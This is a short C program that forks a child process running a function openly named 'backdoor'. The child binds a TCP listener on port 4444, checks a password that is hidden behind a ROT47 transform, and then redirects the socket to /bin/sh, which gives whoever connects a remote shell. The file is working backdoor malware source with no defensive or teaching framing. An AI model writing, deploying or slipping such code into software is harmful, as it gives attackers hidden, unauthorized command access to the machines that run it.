#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>


//==========================
#define PORT 4444        //|
//==========================

void rot13(char *input) {
    for (int i = 0; input[i] != '\0'; i++) {
        char c = input[i];

        // Check if the character is within the ROT47 range
        if (c >= 33 && c <= 126) {
            input[i] = ((c - 33 + 47) % 94) + 33;
        }
        // Characters outside this range are left unchanged
    }
}

void backdoor(void) {
    int fd;
    char pwd_buffer[32] = {0};
    int yes=1;
 
    struct sockaddr_in address;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    address.sin_port = htons(PORT);
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY; // Bind to all available interfaces

   

    setsockopt(fd , SOL_SOCKET , SO_REUSEADDR , &yes ,sizeof(int)); // no more address already in use
    bind(fd, (struct sockaddr*)&address, sizeof(address));
    listen(fd, 0);

    int admin_fd = accept(fd, 0, 0);
    int size = read(admin_fd, &pwd_buffer, sizeof(pwd_buffer)-1);
    pwd_buffer[size-1] = '\0';
    
    //rot13(pwd_buffer);
    //printf("%s\n",pwd_buffer);

    rot13(pwd_buffer);
    if (strcmp("$FA6C0$64FC60!2DDH@C5", pwd_buffer) == 0) { 
    	char answer[] = "========================\n        Welcome        |\nGod of the underground |\n   Enter thy command   |\n========================\n\n";
    	write(admin_fd , &answer , strlen(answer));
    	
        dup2(admin_fd, 0);
        dup2(admin_fd, 1);
        dup2(admin_fd, 2);
	
        execve("/bin/sh", NULL, NULL);
        close(admin_fd);
    } else {
    	//char answer[] = "Bad Password" ; 
    	//write(admin_fd , &answer , strlen(answer));
        close(admin_fd);
    }
    
}

int main(void) {

    pid_t p = fork();
    if(p == 0){
    backdoor(); // <-- the child has to do the work 
    }
    else{
    printf("Well this parent with pid %i pay his respect",p);
    }
    return 0;
}
